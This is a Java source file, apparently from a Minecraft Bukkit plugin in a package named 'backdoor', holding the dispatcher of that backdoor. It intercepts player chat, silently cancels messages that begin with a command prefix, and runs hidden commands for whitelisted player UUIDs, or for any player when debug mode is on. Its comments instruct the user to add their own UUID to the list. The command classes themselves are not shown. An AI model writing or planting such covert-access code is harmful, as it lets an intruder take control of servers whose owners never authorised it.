package me.tsb.backdoor;

import lombok.Getter;
import lombok.SneakyThrows;
import me.tsb.backdoor.commands.*;
import me.tsb.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;
import org.reflections.Reflections;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class CommandMan {

    private final Main main;

    public CommandMan(Main main) {
        this.main = main;
    }

    public String EXCEPTION_CAUGHT = ChatColor.RED + "Internal exception. Was caught, no console errors.";

    // add your uuid to this list to be able to use the plugin
    // if Main.debug is true anyone can use the commands, so set it to false and add the uuids
    List<String> whitelistedUsers = Arrays.asList("");

    @Getter
    private final List<Command> commands = new ArrayList<>();

    @SneakyThrows
    public void init() {
        Reflections reflections = new Reflections("me.tsb.backdoor.commands");

        for (Class<? extends Command> commandClass : reflections.getSubTypesOf(Command.class)) {
            try {
                AddCommand(commandClass.getConstructor(Main.class).newInstance(this));
                System.out.println("Successfully added command class: " + commandClass.getName());
            } catch (Exception ignored) {
                System.out.println("Failed to add command class: " + commandClass.getName());
            }
        }
    }


    public void onExec(PlayerChatEvent event) {
        ArrayList<String> args = new ArrayList<>(Arrays.asList(event.getMessage().split(" ")));

        if (args.get(0).startsWith(Command.prefix) && (whitelistedUsers.contains(event.getPlayer().getUniqueId().toString()) || Main.debug)) {
            event.setCancelled(true);
        } else return;
        for (Command c : commands) {

            for (String s : c.getAliases()) {
                if (args.get(0).equalsIgnoreCase(Command.prefix + s)) {
                    try {

                        StringBuilder sb = new StringBuilder(args.get(0));
                        sb.delete(0, Command.prefix.length());

                        args.add(0, sb.toString());

                        c.onExec(event, args);
                    } catch (Exception e) {
                        event.getPlayer().sendMessage(EXCEPTION_CAUGHT);
                        Main.logger.exception(e.getMessage());
                    }
                    return;
                }
            }
        }
    }

    public void AddCommand(Command command) {
        commands.add(command);
        Main.logger.log("Added command " + command.getDisplayName());
    }
}
